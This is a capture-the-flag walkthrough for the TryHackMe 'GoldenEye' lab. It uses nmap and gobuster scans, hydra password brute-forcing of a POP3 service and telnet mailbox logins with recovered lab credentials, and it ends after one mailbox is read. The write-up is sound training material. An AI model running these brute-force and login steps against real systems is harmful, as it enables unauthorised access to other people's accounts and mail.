# GoldenEye

**Room Link:** [https://tryhackme.com/room/goldeneye](https://tryhackme.com/room/goldeneye)



## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>



## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>



## TCP/80 - HTTP

**Kali**

```
gobuster dir -u $VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```



<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

We find a encoded password and also a potential other user, Natalya.

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

I can login to /sev-home now



```
Username: boris
Password: InvincibleHack3r
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>



## TCP/55007 - POP3

**Kali**

```
telnet $VICTIM 55007
USER boris
PASS InvincibleHack3r
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3://$VICTIM:55007
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://$VICTIM:55007
```

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>





**Kali**

```
telnet $VICTIM 55007
USER natalya
PASS bird
RETR 1
RETR 2
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

New password still doesn't work but maybe can be used elsewhere.

**Kali**

```
telnet $VICTIM 55007
USER boris
PASS secret1!
RETR 1
RETR 2
RETR 3
```

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>





Added severnaya-station.com to my hosts file and then navigated to http://severnaya-station.com/gnocertdir as mentioned in the email

```
username: xenia
password: RCP90rulez!
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://$VICTIM:55007
```



**Kali**

```
telnet $VICTIM 55007
USER doak
PASS goat
RETR 1
```

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>



































